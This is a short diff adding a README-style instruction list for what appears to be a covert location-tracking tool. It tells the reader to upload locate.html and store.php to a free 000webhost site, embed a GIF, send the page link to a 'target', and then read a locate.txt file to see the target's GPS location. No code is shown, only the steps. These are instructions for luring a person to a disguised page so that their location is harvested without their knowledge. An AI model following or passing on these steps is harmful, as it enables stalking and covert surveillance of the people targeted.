@@ -1,0 +1,12 @@
+create a 000webhost profile
+you can past Embed GIF copy code in locate.html () 
+create a web site
+    uplode my files (locate.html , store.php) for public_html
+    now you can right click locate.html file and click view 
+    after that , you can copy locate.html file url 
+    next , send it your target 
+if open it youer target 
+    you can refresh file list
+    now you can see locate.txt file and open it 
+    finaly , you can see your target GPS location
+thank for you !!
